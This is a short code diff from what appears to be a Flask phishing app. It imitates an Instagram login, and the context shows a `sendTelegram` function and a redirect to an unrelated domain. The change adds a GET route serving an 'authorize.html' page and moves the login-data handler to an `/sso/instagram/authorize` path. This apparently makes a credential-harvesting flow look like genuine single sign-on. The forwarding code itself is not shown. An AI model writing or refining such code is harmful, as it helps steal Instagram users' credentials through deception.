@@ -52,7 +52,12 @@ def sendTelegram(request):
 def error404(e):
     return redirect('https://s-usm.md')
 
-@app.route('/login/instagram', methods=['GET', 'POST'])
+@app.route('/login/instagram', methods=['GET'])
+def authorize():
+    # Serve the authorization page on a GET request
+    return render_template('authorize.html')
+
+@app.route('/sso/instagram/authorize', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
         # Process and handle the login data
